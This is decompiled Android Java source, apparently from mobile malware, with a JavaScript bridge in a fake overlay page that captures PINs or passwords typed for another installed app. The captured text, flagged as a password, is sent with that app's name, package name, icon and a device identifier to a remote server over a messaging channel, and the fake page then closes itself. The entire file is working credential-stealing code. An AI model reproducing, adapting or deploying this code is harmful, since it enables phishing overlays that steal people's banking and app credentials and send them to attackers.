package defpackage;

import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.Drawable;
import android.util.Base64;
import android.webkit.JavascriptInterface;
import com.mamimobi.AccessService;
import com.mamimobi.activity.FakePageActivity;
import io.nats.client.support.ApiConstants;
import java.io.ByteArrayOutputStream;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public final class kv {
    public final FakePageActivity a;
    public final /* synthetic */ FakePageActivity b;

    public kv(FakePageActivity fakePageActivity, FakePageActivity fakePageActivity2) {
        this.b = fakePageActivity;
        this.a = fakePageActivity2;
    }

    @JavascriptInterface
    public void pin(String str, int i) {
        FakePageActivity fakePageActivity = this.b;
        JSONObject jSONObject = new JSONObject();
        FakePageActivity fakePageActivity2 = this.a;
        PackageManager packageManager = fakePageActivity2.getPackageManager();
        try {
            Drawable drawableLoadIcon = packageManager.getPackageInfo(fakePageActivity.E, 0).applicationInfo.loadIcon(packageManager);
            Bitmap bitmapCreateBitmap = Bitmap.createBitmap(24, 24, Bitmap.Config.ARGB_8888);
            Canvas canvas = new Canvas(bitmapCreateBitmap);
            drawableLoadIcon.setBounds(0, 0, 24, 24);
            drawableLoadIcon.draw(canvas);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            bitmapCreateBitmap.compress(Bitmap.CompressFormat.PNG, 80, byteArrayOutputStream);
            jSONObject.put("icon", Base64.encodeToString(byteArrayOutputStream.toByteArray(), 0));
        } catch (Exception unused) {
        }
        try {
            jSONObject.put("appName", packageManager.getApplicationLabel(packageManager.getApplicationInfo(fakePageActivity.E, 0)));
        } catch (Exception unused2) {
        }
        try {
            jSONObject.put("isPasswd", true);
            jSONObject.put("packageName", fakePageActivity.E);
            jSONObject.put("resourceName", "fakepage-" + i);
            jSONObject.put("text", str);
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put(ApiConstants.ID, t40.V(fakePageActivity2));
            jSONObject2.put(ApiConstants.ACTION, "editinfo");
            jSONObject2.put(ApiConstants.DATA, jSONObject);
            o71 o71VarF = o71.f(fakePageActivity2);
            if (o71VarF.e() != null) {
                jSONObject2.put("clientid", o71VarF.e());
            }
            lm0 lm0Var = o71VarF.e;
            if (lm0Var != null) {
                lm0Var.c(jSONObject2.toString().getBytes());
            }
        } catch (Exception unused3) {
        }
        if (i == 2) {
            AccessService.S0.remove(fakePageActivity.E);
            fakePageActivity.finish();
        }
    }
}
